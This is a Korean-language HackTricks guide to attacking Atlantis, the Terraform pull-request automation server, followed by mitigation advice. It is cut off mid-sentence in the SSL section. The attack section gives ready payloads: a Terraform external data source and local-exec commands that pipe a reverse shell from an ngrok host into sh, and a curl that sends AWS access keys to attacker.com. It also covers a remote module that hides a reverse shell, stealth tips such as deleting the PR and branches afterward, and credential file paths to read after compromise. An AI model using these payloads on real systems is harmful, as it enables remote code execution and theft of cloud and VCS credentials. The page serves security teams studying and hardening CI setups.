# Atlantis 보안

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에 광고되기를 원하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

## 기본 정보

Atlantis는 기본적으로 git 서버에서 Pull Requests를 통해 terraform을 실행하는 데 도움을 줍니다.

![](<../.gitbook/assets/image (51).png>)

## 로컬 랩

1. [https://github.com/runatlantis/atlantis/releases](https://github.com/runatlantis/atlantis/releases)의 **atlantis 릴리스 페이지**로 이동하여 **적합한** 버전을 **다운로드**합니다.
2. **github** 사용자의 **repo 액세스**를 가진 **개인 토큰**을 생성합니다.
3. `./atlantis testdrive`를 실행하면 **데모 리포**가 생성되어 **atlantis와 대화**할 수 있습니다.
1. 웹 페이지에는 127.0.0.1:4141에서 액세스할 수 있습니다.

## Atlantis 액세스

### Git 서버 자격 증명

**Atlantis**는 **Github**, **Gitlab**, **Bitbucket** 및 **Azure DevOps**와 같은 여러 git 호스트를 지원합니다.\
그러나 이러한 플랫폼의 리포지토리에 액세스하고 작업을 수행하려면 일부 **권한이 부여된 특권 액세스**가 필요합니다.\
[**문서**](https://www.runatlantis.io/docs/access-credentials.html#create-an-atlantis-user-optional)에서는 Atlantis를 위해 특정 플랫폼에 사용자를 생성하는 것을 권장하지만 일부 사람들은 개인 계정을 사용할 수도 있습니다.

{% hint style="warning" %}
어떤 경우에도, 공격자의 관점에서는 **Atlantis 계정**이 매우 **흥미로운 대상**이 될 것입니다.
{% endhint %}

### 웹훅

Atlantis는 선택적으로 [**웹훅 비밀**](https://www.runatlantis.io/docs/webhook-secrets.html#generating-a-webhook-secret)을 사용하여 Git 호스트로부터 수신한 **웹훅**이 **정당한지** 확인합니다.

이를 확인하는 한 가지 방법은 요청이 Git 호스트의 IP에서만 올 수 있도록 **허용 목록**을 설정하는 것이지만, 웹훅 비밀을 사용하는 것이 더 쉬운 방법입니다.

참고로, 개인 github 또는 bitbucket 서버를 사용하지 않는 한 웹훅 엔드포인트를 인터넷에 노출해야 합니다.

{% hint style="warning" %}
Atlantis는 git 서버가 정보를 보낼 수 있도록 **웹훅을 노출**할 것입니다. 공격자의 관점에서는 **메시지를 보낼 수 있는지** 알 수 있는 것이 흥미로울 것입니다.
{% endhint %}

### 공급자 자격 증명 <a href="#provider-credentials" id="provider-credentials"></a>

[문서에서](https://www.runatlantis.io/docs/provider-credentials.html)는 다음과 같이 설명합니다:

Atlantis는 Terraform을 실행하기 위해 단순히 서버에서 `terraform plan` 및 `apply` 명령을 실행합니다. 로컬에서 Terraform을 실행할 때와 마찬가지로 Atlantis는 특정 공급자의 자격 증명이 필요합니다.

Atlantis에 특정 공급자의 자격 증명을 [제공하는 방법](https://www.runatlantis.io/docs/provider-credentials.html#aws-specific-info)은 다음과 같습니다:

* Atlantis [Helm Chart](https://www.runatlantis.io/docs/deployment.html#kubernetes-helm-chart) 및 [AWS Fargate Module](https://www.runatlantis.io/docs/deployment.html#aws-fargate)에는 공급자 자격 증명을 위한 고유한 메커니즘이 있습니다. 해당 문서를 읽으세요.
* 클라우드에서 Atlantis를 실행하는 경우 많은 클라우드에서 애플리케이션에 클라우드 API 액세스를 제공하는 방법이 있습니다. 예:
* [AWS EC2 역할](https://registry.terraform.io/providers/hashicorp/aws/latest/docs) (EC2 역할 검색)
* [GCE 인스턴스 서비스 계정](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider\_reference)
* 많은 사용자가 Atlantis가 실행되는 위치에 따라 환경 변수를 설정합니다. 예: `AWS_ACCESS_KEY`
* 다른 사용자는 Atlantis가 실행되는 위치에 필요한 구성 파일을 생성합니다. 예: `~/.aws/credentials`
* [HashiCorp Vault Provider](https://registry.terraform.io/providers/hashicorp/vault/latest/docs)를 사용하여 공급자 자격 증명을 얻습니다.

{% hint style="warning" %}
Atlantis가 **실행**되는 **컨테이너**에는 Atlantis가 Terraform을 통해 관리하는 공급자 (AWS, GCP, Github...)에 대한 **특권 자격 증명**이 있을 것입니다.
{% endhint %}

### 웹 페이지

기본적으로 Atlantis는 **로컬호스트의 포트 4141에서 웹 페이지를 실행**합니다. 이 페이지는 atlantis apply를 활성화/비활성화하고 리포지토리의 계획 상태를 확인하며 리포지토리를 잠금 해제하는 기능만 제공합니다 (따라서 수정하는 기능은 제공되지 않으므로 그다지 유용하지 않습니다).

아마도 인터넷에 노출되지 않을 것이지만, 기본적으로 액세스하기 위해 **자격 증명이 필요하지 않습니다** (필요한 경우 `atlantis`:`atlantis`가 **기본**입니다).

## 서버 구성

`atlantis server`의 구성은 명령줄 플래그, 환경 변수, 구성 파일 또는 이 세 가지의 조합을 통해 지정할 수 있습니다.

* Atlantis 서버에서 지원하는 [**플래그 목록은 여기에서 찾을 수 있습니다**](https://www.runatlantis.io/docs/server-configuration.html#server-configuration)
* [**구성 옵션을 환경 변수로 변환하는 방법은 여기에서 찾을 수 있습니다**](https://www.runatlantis.io/docs/server-configuration.html#environment-variables)

값은 다음과 같은 **순서로 선택**됩니다:

1. 플래그
2. 환경 변수
3. 구성 파일

{% hint style="warning" %}
구성에서는 **토큰 및 비밀번호**와 같은 흥미로운 값들을 찾을 수 있습니다.
{% endhint %}

### 리포지토리 구성

일부 구성은 **리포지토리가 관리되는 방식**에 영향을 미칩니다. 그러나 **각 리포지토리가 다른 설정을 필요로 할 수** 있으므로 각 리
#### PR Protections

Atlantis는 **PR**이 **`approved`**되기를 원하는 경우 (branch protection에 설정되지 않은 경우에도) 다른 사람에 의해 승인되도록하고/또는 **`mergeable`**하도록 설정할 수 있습니다 (branch protection 통과 후) **apply를 실행하기 전에**. 보안적인 측면에서는 두 가지 옵션을 모두 설정하는 것이 권장됩니다.

`allowed_overrides`가 True인 경우, 이 설정은 **각 프로젝트에서 `/atlantis.yml` 파일로 덮어쓸 수 있습니다**.

#### Scripts

리포지토리 구성은 워크플로우가 실행되기 **전에** (_pre workflow hooks_) [**실행할 스크립트를 지정**](https://www.runatlantis.io/docs/pre-workflow-hooks.html#usage)하거나 워크플로우가 실행된 **후에** (_post workflow hooks_) [**실행할 스크립트를 지정**](https://www.runatlantis.io/docs/post-workflow-hooks.html)할 수 있습니다.

리포지토리 `/atlantis.yml` 파일에서 이러한 스크립트를 **지정**할 수 있는 옵션이 없습니다.

#### Workflow

리포지토리 구성 (서버 측 구성)에서는 [**새로운 기본 워크플로우를 지정**](https://www.runatlantis.io/docs/server-side-repo-config.html#change-the-default-atlantis-workflow)하거나 [**새로운 사용자 정의 워크플로우를 생성**](https://www.runatlantis.io/docs/custom-workflows.html#custom-workflows)**할 수 있습니다**. 또한 생성된 **새로운** 워크플로우에 **접근할 수 있는** **리포지토리**를 **지정**할 수 있습니다.\
그런 다음, 각 리포지토리의 **atlantis.yaml** 파일에서 사용할 워크플로우를 **지정**할 수 있습니다.

{% hint style="danger" %}
[**서버 측 구성**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) 플래그 `allow_custom_workflows`가 **True**로 설정된 경우, 각 리포지토리의 **`atlantis.yaml`** 파일에서 워크플로우를 **지정**할 수 있습니다. 또한 **`allowed_overrides`**가 사용될 워크플로우를 **덮어쓰기**하기 위해 **`workflow`**도 지정되어야 할 수도 있습니다.\
이는 사실상 해당 리포지토리에 액세스 할 수 있는 모든 사용자에게 Atlantis 서버에서 **RCE를 제공**합니다.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

#### Conftest 정책 확인

Atlantis는 계획 출력에 대해 **서버 측** [**conftest**](https://www.conftest.dev/) **정책**을 실행하는 것을 지원합니다. 이 단계를 사용하는 일반적인 사례는 다음과 같습니다:

* 모듈 목록 사용 거부
* 리소스 생성 시 리소스의 속성 단언
* 의도하지 않은 리소스 삭제 감지
* 보안 위험 방지 (예: 공개 포트 노출)

[**문서**](https://www.runatlantis.io/docs/policy-checking.html#how-it-works)에서 구성하는 방법을 확인할 수 있습니다.

## Atlantis 명령어

[**문서**](https://www.runatlantis.io/docs/using-atlantis.html#using-atlantis)에서 Atlantis를 실행하는 데 사용할 수 있는 옵션을 찾을 수 있습니다.
```bash
# Get help
atlantis help

# Run terraform plan
atlantis plan [options] -- [terraform plan flags]
##Options:
## -d directory
## -p project
## --verbose
## You can also add extra terraform options

# Run terraform apply
atlantis apply [options] -- [terraform apply flags]
##Options:
## -d directory
## -p project
## -w workspace
## --auto-merge-disabled
## --verbose
## You can also add extra terraform options
```
## 공격

{% hint style="warning" %}
공격 중에 다음 **오류**를 발견하면: `Error: Error acquiring the state lock`

다음을 실행하여 해결할 수 있습니다:
```
atlantis unlock #You might need to run this in a different PR
atlantis plan -- -lock=false
```
{% endhint %}

### Atlantis 계획 RCE - 새로운 PR에서 구성 변경

접근 권한이 있는 저장소에서는 새로운 브랜치를 생성하고 PR을 생성할 수 있습니다. `atlantis plan`을 실행할 수 있다면 (또는 자동으로 실행될 수도 있음) Atlantis 서버 내에서 RCE를 실행할 수 있습니다.

이를 위해 [Atlantis가 외부 데이터 소스를 로드하도록](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source) 설정할 수 있습니다. `main.tf` 파일에 다음과 같은 페이로드를 넣어주세요:
```json
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### 은밀한 공격

이 공격을 더 은밀하게 수행할 수도 있습니다. 다음의 제안을 따라서:

* 테라폼 파일에 직접적으로 역쉘이 포함되는 대신, 역쉘을 포함하는 **외부 리소스를 로드**할 수 있습니다:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
[https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)에서 rev shell 코드를 찾을 수 있습니다.

* 외부 리소스에서는 **ref** 기능을 사용하여 **repo 내의 브랜치에 terraform rev shell 코드를 숨길 수 있습니다**. 예를 들어 `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`와 같이 사용합니다.
* Atlantis를 트리거하기 위해 **마스터로 PR을 생성하는 대신**, **2개의 브랜치** (test1과 test2)를 생성하고 **한 브랜치에서 다른 브랜치로 PR을 생성**합니다. 공격을 완료한 후, **PR과 브랜치를 삭제**합니다.

### Atlantis plan Secrets Dump

`atlantis plan` (`terraform plan`)을 실행하여 **terraform에서 사용되는 비밀 정보를 덤프**할 수 있습니다. 이를 위해 terraform 파일에 다음과 같이 추가합니다:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
### Atlantis apply RCE - 새로운 PR에서의 구성 수정

만약 리포지토리에 쓰기 권한이 있다면, 해당 리포지토리에 새로운 브랜치를 생성하고 PR을 생성할 수 있습니다. 만약 **`atlantis apply`를 실행할 수 있다면 Atlantis 서버 내에서 RCE를 실행할 수 있습니다**.

하지만, 일반적으로 일부 보호 기능을 우회해야 합니다:

* **병합 가능(Mergeable)**: 만약 Atlantis에서 이 보호 기능이 설정되어 있다면, **PR이 병합 가능한 경우에만 `atlantis apply`를 실행할 수 있습니다** (즉, 브랜치 보호 기능을 우회해야 합니다).
* [**브랜치 보호 우회**](broken-reference/)에 대한 가능한 우회 방법 확인
* **승인(Approved)**: 만약 Atlantis에서 이 보호 기능이 설정되어 있다면, **다른 사용자가 PR을 승인해야만 `atlantis apply`를 실행할 수 있습니다**.
* 기본적으로 [**Gitbot 토큰을 악용하여 이 보호 기능을 우회**](broken-reference/)할 수 있습니다.

악의적인 Terraform 파일에 **`local-exec`을 사용하여 `terraform apply`를 실행**합니다.\
다음과 같은 페이로드가 `main.tf` 파일에 포함되도록만 확인하면 됩니다:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
이전 기술에서 제안한 내용을 따르면 이 공격을 **더 은밀하게** 수행할 수 있습니다.

### Terraform Param Injection

`atlantis plan` 또는 `atlantis apply`를 실행할 때 terraform은 내부적으로 실행됩니다. 이때, atlantis에서 terraform에게 명령을 전달할 수 있습니다. 다음과 같이 주석을 달아 terraform에게 명령을 전달할 수 있습니다:
```bash
atlantis plan -- <terraform commands>
atlantis plan -- -h #Get terraform plan help

atlantis apply -- <terraform commands>
atlantis apply -- -h #Get terraform apply help
```
일부 보호 기능을 우회하는 데 도움이 될 수 있는 환경 변수를 전달할 수 있습니다. [https://www.terraform.io/cli/config/environment-variables](https://www.terraform.io/cli/config/environment-variables)에서 terraform 환경 변수를 확인하세요.

### 사용자 정의 워크플로우

`atlantis.yaml` 파일에 지정된 **악성 사용자 정의 빌드 명령어**를 실행합니다. Atlantis는 `master`가 아닌 풀 리퀘스트 브랜치의 `atlantis.yaml` 파일을 사용합니다.\
이 가능성은 이전 섹션에서 언급되었습니다:

{% hint style="danger" %}
[**서버 측 구성**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) 플래그 `allow_custom_workflows`가 **True**로 설정된 경우, 각 리포지토리의 **`atlantis.yaml`** 파일에 워크플로우를 **지정**할 수 있습니다. 또한 **`allowed_overrides`**가 **`workflow`**도 **지정**해야 하는 경우도 있습니다.

이렇게 하면 해당 리포지토리에 액세스할 수 있는 모든 사용자에게 Atlantis 서버에서 **원격 코드 실행(RCE)**이 제공됩니다.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

### 계획/적용 보호 우회

만약 [**서버 측 구성**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) 플래그 `allowed_overrides`에 `apply_requirements`가 구성되어 있다면, 리포지토리는 계획/적용 보호를 **우회하여 수정**할 수 있습니다.
```yaml
repos:
- id: /.*/
apply_requirements: []
```
### PR Hijacking

만약 누군가가 유효한 pull request에 대해 **`atlantis plan/apply` 주석을 보낸다면**, 원하지 않는 상황에서 terraform이 실행될 수 있습니다.

또한, **branch protection**에서 새로운 커밋이 푸시될 때마다 PR을 **재평가**하도록 구성하지 않은 경우, 누군가는 terraform 구성에서 악성 구성을 작성하고 `atlantis plan/apply`를 실행하여 RCE를 얻을 수 있습니다.

이것은 Github 브랜치 보호 설정입니다:

![](<../.gitbook/assets/image (31).png>)

### Webhook Secret

웹훅 비밀 키를 **훔치는** 데 성공하거나 웹훅 비밀 키가 **사용되지 않는 경우**, Atlantis 웹훅을 호출하고 atlantis 명령을 직접 실행할 수 있습니다.

### Bitbucket

Bitbucket Cloud는 **웹훅 비밀 키를 지원하지 않습니다**. 이로 인해 공격자가 Bitbucket에서 요청을 위장할 수 있습니다. Bitbucket IP만 허용하도록 설정하세요.

* 이는 공격자가 Bitbucket에서 온 것처럼 보이는 가짜 요청을 Atlantis에 보낼 수 있다는 것을 의미합니다.
* `--repo-allowlist`를 지정하고 있다면, 그들은 해당 저장소에 대한 가짜 요청만 생성할 수 있으므로 가장 큰 피해는 자신의 저장소에서 plan/apply를 수행하는 것입니다.
* 이를 방지하기 위해 [Bitbucket의 IP 주소](https://confluence.atlassian.com/bitbucket/what-are-the-bitbucket-cloud-ip-addresses-i-should-use-to-configure-my-corporate-firewall-343343385.html)를 허용 목록에 추가하세요 (Outbound IPv4 주소 참조).

## 사후 침투

서버에 액세스하거나 적어도 LFI를 얻은 경우 읽어볼만한 흥미로운 정보가 있습니다:

* `/home/atlantis/.git-credentials` VCS 액세스 자격 증명을 포함합니다.
* `/atlantis-data/atlantis.db` 자세한 정보가 포함된 VCS 액세스 자격 증명을 포함합니다.
* `/atlantis-data/repos/<org_name>`_`/`_`<repo_name>/<pr_num>/<workspace>/<path_to_dir>/.terraform/terraform.tfstate` Terraform 상태 파일
* 예시: /atlantis-data/repos/ghOrg\_/\_myRepo/20/default/env/prod/.terraform/terraform.tfstate
* `/proc/1/environ` 환경 변수
* `/proc/[2-20]/cmdline` `atlantis server`의 명령줄 (민감한 데이터 포함 가능)

## 완화 방법

### 공개 저장소에서 사용하지 마세요 <a href="#don-t-use-on-public-repos" id="don-t-use-on-public-repos"></a>

모든 보안 완화 조치가 가능하더라도, 누구나 공개 pull request에 주석을 남길 수 있으므로, 보안 설정을 적절하게 구성하지 않은 경우 공개 저장소에서 Atlantis를 실행하는 것은 여전히 위험합니다.

### `--allow-fork-prs`를 사용하지 마세요 <a href="#don-t-use-allow-fork-prs" id="don-t-use-allow-fork-prs"></a>

권장되지 않는 공개 저장소에서 실행 중인 경우 `--allow-fork-prs` (기본값은 false)를 설정하지 마세요. 누구나 자신의 포크에서 귀하의 저장소로 pull request를 열 수 있습니다.

### `--repo-allowlist` <a href="#repo-allowlist" id="repo-allowlist"></a>

Atlantis는 `--repo-allowlist` 플래그를 통해 웹훅을 허용할 저장소의 목록을 지정해야 합니다. 예를 들면:

* 특정 저장소: `--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
* 전체 조직: `--repo-allowlist=github.com/runatlantis/*`
* GitHub Enterprise 설치의 모든 저장소: `--repo-allowlist=github.yourcompany.com/*`
* 모든 저장소: `--repo-allowlist=*`. 보호된 네트워크에서 사용할 때 유용하지만 웹훅 비밀 키를 설정하지 않으면 위험합니다.

이 플래그는 Atlantis 설치가 제어하지 않는 저장소와 함께 사용되지 않도록 보장합니다. 자세한 내용은 `atlantis server --help`를 참조하세요.

### Terraform 계획 보호 <a href="#protect-terraform-planning" id="protect-terraform-planning"></a>

악성 Terraform 코드로 pull request를 제출하는 공격자가 위협 모델에 포함된다면, `terraform apply` 승인만으로는 충분하지 않습니다. [`external` 데이터 소스](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source)를 사용하거나 악성 공급자를 지정하여 `terraform plan`에서 악성 코드를 실행할 수 있습니다. 이 코드는 자격 증명을 유출할 수 있습니다.

이를 방지하기 위해 다음을 수행할 수 있습니다:

1. Atlantis 이미지에 공급자를 포함하고 운영 환경에서 egress를 거부합니다.
2. 공급자 레지스트리 프로토콜을 내부적으로 구현하고 공개 egress를 거부하여 누가 레지스트리에 쓰기 액세스 권한을 가지는지 제어합니다.
3. [서버 측 저장소 구성](https://www.runatlantis.io/docs/server-side-repo-config.html)의 `plan` 단계를 수정하여 허용되지 않은 공급자나 데이터 소스의 사용 또는 허용되지 않은 사용자의 PR을 검증할 수 있습니다. 또한 이 시점에서 추가 검증을 추가할 수도 있습니다. 예를 들어 `plan`이 계속되기 전에 PR에 대한 "좋아요"를 요구할 수 있습니다. 여기에는 Conftest를 사용할 수 있습니다.

### 웹훅 비밀 키 <a href="#webhook-secrets" id="webhook-secrets"></a>

Atlantis는 `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET` 환경 변수를 통해 웹훅 비밀 키를 설정해야 합니다. `--repo-allowlist` 플래그가 설정되어 있더라도 웹훅 비밀 키가 없으면, 웹훅 요청을 허용된 저장소로 위장한 공격자가 Atlantis에 요청을 보낼 수 있습니다. 웹훅 비밀 키는 웹훅 요청이 실제로 VCS 공급자(GitHub 또는 GitLab)에서 온 것임을 보장합니다.

Azure DevOps를 사용하는 경우 웹훅 비밀 키 대신 기본 사용자 이름과 암호를 추가하세요.

### Azure DevOps 기본 인증 <a href="#azure-devops-basic-authentication" id="azure-devops-basic-authentication"></a>

Azure DevOps는 모든 웹훅 이벤트에서 기본 인증 헤더를 전송할 수 있습니다. 이는 웹훅 위치에 HTTPS URL을 사용해야 합니다.

### SSL/HTTPS <a href="#ssl-https" id="ssl-https"></a>

웹훅 비밀 키를 사용하더라도 트래픽이 HTTP를 통해
